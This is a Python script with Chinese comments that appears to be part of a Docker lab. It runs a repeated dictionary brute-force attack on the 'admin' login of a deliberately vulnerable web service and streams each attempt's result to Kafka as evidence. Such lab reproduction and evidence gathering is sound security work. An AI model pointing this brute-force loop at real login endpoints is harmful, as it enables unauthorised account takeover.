# 文件路径: producer/producer.py
import time
import json
import requests
import os
from kafka import KafkaProducer

# 获取 Docker 环境变量里的 Kafka 地址
KAFKA_BROKER = os.environ.get('KAFKA_BROKER', 'kafka:9092')
TOPIC = 'evidence_topic'
# 注意：这里使用服务名 'vuln-web'，因为它们在同一个 Docker 网络里
TARGET_URL = 'http://vuln-web:5000/login'

def get_producer():
    # 增加重试机制，确保 Kafka 启动时可以连接上
    while True:
        try:
            print(f"正在连接 Kafka: {KAFKA_BROKER} ...")
            producer = KafkaProducer(
                bootstrap_servers=[KAFKA_BROKER],
                value_serializer=lambda x: json.dumps(x).encode('utf-8')
            )
            print("Kafka 连接成功！")
            return producer
        except Exception as e:
            print(f"Kafka 连接失败，5秒后重试: {e}")
            time.sleep(5)

def run_attack():
    producer = get_producer()

    # 读取密码字典
    with open('payloads.txt', 'r') as f:
        passwords = [line.strip() for line in f.readlines()]

    print("=== 开始自动化暴力破解漏洞复现 ===")

    for password in passwords:
        payload = {"username": "admin", "password": password}

        try:
            # 发起真实的 HTTP 攻击请求
            response = requests.post(TARGET_URL, json=payload, timeout=5)

            # 判断攻击结果
            is_success = (response.status_code == 200)
            status_str = "攻击成功！(SUCCESS)" if is_success else "失败 (Fail)"

            print(f"[*] 尝试密码: {password} -> {status_str}")

            # 构造 Evidence 证据数据
            evidence = {
                "timestamp": time.time(),
                "attack_type": "brute_force",
                "target": TARGET_URL,
                "payload": password,
                "http_status": response.status_code,
                "result": "success" if is_success else "fail"
            }

            # 发送给 Kafka
            producer.send(TOPIC, value=evidence)
            producer.flush()

        except Exception as e:
            # 如果网站还没启动或网络不通，会报错
            print(f"[!] 请求靶机出错，可能服务未启动: {e}")

        time.sleep(1) 

    print("=== 本轮攻击完成 ===")

if __name__ == '__main__':
    # 循环运行，每 30 秒执行一次完整的字典攻击
    while True:
        run_attack()
        time.sleep(30)

